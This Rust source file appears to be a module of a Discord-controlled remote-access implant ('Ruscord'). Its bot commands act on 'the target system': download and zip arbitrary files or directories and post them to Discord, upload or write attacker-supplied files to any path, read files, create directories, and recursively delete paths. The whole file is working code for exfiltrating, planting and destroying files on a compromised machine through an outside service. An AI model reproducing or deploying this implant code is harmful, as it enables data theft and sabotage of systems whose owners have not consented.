use crate::{
    commands::command_channel_check, reply_as_attachment, say, RuscordContext, RuscordResult,
};
use poise::{serenity_prelude::*, CreateReply};
use std::{
    future::Future,
    io::{Seek, Write},
    path::{Path, PathBuf},
};
use tokio::{fs::File, io::AsyncWriteExt};
use walkdir::{DirEntry, WalkDir};
use zip::write::SimpleFileOptions;

#[poise::command(prefix_command, slash_command, check = command_channel_check)]
/// Download a file from the target system
pub async fn download(
    ctx: RuscordContext<'_>,
    #[description = "Path to the file / directory to download"] path: String,
    #[description = "Whether or not the directory should be downloaded recursively. No effect on files."]
    recursive: Option<bool>,
) -> RuscordResult<()> {
    ctx.defer().await?;
    let recursive = recursive.unwrap_or(false);
    let path = PathBuf::from(path);

    if !path.exists() {
        say!(ctx, "File does not exist: {}", path.display());
        return Ok(());
    }

    let filename = path
        .file_name()
        .and_then(|n| n.to_str())
        .unwrap_or("downloaded_file");

    let content = if path.is_dir() {
        let mut buffer = Vec::new();
        let cursor = std::io::Cursor::new(&mut buffer);
        let walkdir = WalkDir::new(&path).max_open(1000).max_depth(10);

        // Limit max depth to 1 if not recursive
        let it = if recursive {
            walkdir.into_iter()
        } else {
            walkdir.max_depth(1).into_iter()
        };

        zip_dir(
            &mut it.filter_map(|e| e.ok()),
            &path,
            cursor,
            zip::CompressionMethod::Deflated,
        )
        .await?;

        buffer
    } else {
        tokio::fs::read(&path).await?
    };

    let content_length = content.len();
    let final_filename = if path.is_dir() {
        format!("{}.zip", filename)
    } else {
        filename.to_string()
    };

    ctx.send(
        CreateReply::default()
            .content(format!(
                "Downloaded {} bytes from {}",
                content_length,
                path.display()
            ))
            .attachment(CreateAttachment::bytes(content, final_filename)),
    )
    .await?;

    Ok(())
}

#[allow(clippy::manual_async_fn)] // Necessary otherwise complains about Send bounds
/// Zip a directory
fn zip_dir<'a, T>(
    it: &'a mut (dyn Iterator<Item = DirEntry> + Send),
    prefix: &'a Path,
    writer: T,
    method: zip::CompressionMethod,
) -> impl Future<Output = RuscordResult<()>> + Send + 'a
where
    T: Write + Seek + Send + 'a,
{
    async move {
        let mut zip = zip::ZipWriter::new(writer);
        let options = SimpleFileOptions::default()
            .compression_method(method)
            .unix_permissions(0o755);

        let prefix = Path::new(&prefix);
        for entry in it {
            let path = entry.path();
            let name = path.strip_prefix(prefix).unwrap();
            let path_as_string = name.to_str().map(str::to_owned).ok_or_else(|| {
                std::io::Error::new(
                    std::io::ErrorKind::InvalidData,
                    format!("{name:?} Is a Non UTF-8 Path"),
                )
            })?;

            // Write file or directory explicitly
            // Some unzip tools unzip files with directory paths correctly, some do not!
            if path.is_file() {
                zip.start_file(path_as_string, options)?;
                let content = tokio::fs::read(&path).await?;
                zip.write_all(&content)?;
            } else if !name.as_os_str().is_empty() {
                // Only if not root! Avoids path spec / warning
                // and mapname conversion failed error on unzip
                zip.add_directory(path_as_string, options)?;
            }
        }
        zip.finish()?;
        Ok(())
    }
}

#[poise::command(prefix_command, slash_command, check = command_channel_check)]
/// Upload a file to the target system
pub async fn upload(
    ctx: RuscordContext<'_>,
    #[description = "Path where to save the file"] path: String,
    #[description = "Attachment to upload"] attachment: Attachment,
) -> RuscordResult<()> {
    let path = PathBuf::from(path);

    // Create directories if they don't exist
    if let Some(parent) = path.parent() {
        tokio::fs::create_dir_all(parent).await?;
    }

    let content = attachment.download().await?;
    let mut file = File::create(&path).await?;
    file.write_all(&content).await?;
    say!(ctx, "Successfully uploaded file to: `{}`", path.display());
    Ok(())
}

#[poise::command(prefix_command, slash_command, check = command_channel_check)]
/// Display contents of a file
pub async fn cat(
    ctx: RuscordContext<'_>,
    #[description = "Path to the file to read"] path: String,
) -> RuscordResult<()> {
    let path = PathBuf::from(path);

    if !path.exists() {
        say!(ctx, "File does not exist: {}", path.display());
        return Ok(());
    }

    let content = tokio::fs::read_to_string(&path).await?;
    let filename = path
        .file_name()
        .and_then(|n| n.to_str())
        .unwrap_or("content.txt");
    reply_as_attachment!(ctx, filename, content);

    Ok(())
}

#[poise::command(prefix_command, slash_command, check = command_channel_check)]
/// Write content to a file
pub async fn write(
    ctx: RuscordContext<'_>,
    #[description = "Path to the file"] path: String,
    #[description = "Content to write"] content: String,
) -> RuscordResult<()> {
    let path = PathBuf::from(path);

    if let Some(parent) = path.parent() {
        tokio::fs::create_dir_all(parent).await?;
    }

    tokio::fs::write(&path, content).await?;
    say!(ctx, "Successfully wrote to file: `{}`", path.display());
    Ok(())
}

#[poise::command(prefix_command, slash_command, check = command_channel_check)]
/// Create a new directory
pub async fn mkdir(
    ctx: RuscordContext<'_>,
    #[description = "Path to create"] path: String,
) -> RuscordResult<()> {
    let path = PathBuf::from(path);
    tokio::fs::create_dir_all(&path).await?;
    say!(ctx, "Successfully created directory: `{}`", path.display());
    Ok(())
}

#[poise::command(prefix_command, slash_command, check = command_channel_check)]
/// Remove a file or directory
pub async fn rm(
    ctx: RuscordContext<'_>,
    #[description = "Path to remove"] path: String,
    #[description = "Recursively remove directories"] recursive: Option<bool>,
) -> RuscordResult<()> {
    let path = PathBuf::from(path);
    let recursive = recursive.unwrap_or(false);

    if !path.exists() {
        say!(ctx, "Path does not exist: `{}`", path.display());
        return Ok(());
    }

    if path.is_dir() {
        if recursive {
            tokio::fs::remove_dir_all(&path).await?;
        } else {
            tokio::fs::remove_dir(&path).await?;
        }
    } else {
        tokio::fs::remove_file(&path).await?;
    }

    say!(ctx, "Successfully removed: `{}`", path.display());
    Ok(())
}
